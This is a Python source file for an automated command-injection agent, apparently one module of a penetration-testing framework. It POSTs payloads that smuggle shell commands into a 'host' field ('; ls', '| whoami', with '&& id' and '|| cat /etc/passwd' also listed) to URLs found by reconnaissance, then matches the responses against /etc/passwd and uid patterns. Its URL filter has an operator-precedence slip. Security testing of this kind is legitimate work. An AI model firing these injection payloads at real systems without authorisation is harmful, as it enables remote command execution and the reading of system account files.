
"""Enhanced Command Injection Agent - FIXED for Real World Testing"""
import asyncio
import aiohttp
import re
from typing import Dict, List, Any, Optional
from loguru import logger
from agents.base import BaseAgent, AgentResult

class EnhancedCommandInjectionAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="command_injection_agent", agent_type="exploit")
        self.description = "Professional command injection testing"
        self.payloads = ["; ls", "| whoami", "&& id", "|| cat /etc/passwd"]
        
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> AgentResult:
        config = config or {}
        results = {"agent": self.name, "target": target, "vulnerabilities": [], "urls_tested": 0}
        discovered_urls = config.get("discovered_urls", [])
        
        if not discovered_urls:
            return AgentResult(success=True, data=results, message="No URLs from recon")
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
            for url_data in discovered_urls[:10]:
                url = url_data.get("url", "") if isinstance(url_data, dict) else str(url_data)
                if url and "rce" in url.lower() or "ping" in url.lower() or "exec" in url.lower():
                    results["urls_tested"] += 1
                    vuln = await self._test_rce(session, url)
                    if vuln:
                        results["vulnerabilities"].append(vuln)
        
        return AgentResult(success=True, data=results, message=f"Found {len(results['vulnerabilities'])} RCE")
    
    async def _test_rce(self, session, url):
        for payload in self.payloads[:2]:
            try:
                async with session.post(url, json={"host": f"127.0.0.1{payload}"}, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    text = await response.text()
                    # Real detection: Check for command output patterns
                    if re.search(r'root:.*:/bin/(bash|sh)', text) or re.search(r'uid=\d+', text):
                        return {"vulnerability_type": "command_injection", "severity": "CRITICAL", "url": url, "payload": payload, "title": "Command Injection", "cwe": "CWE-78"}
            except:
                pass
        return None
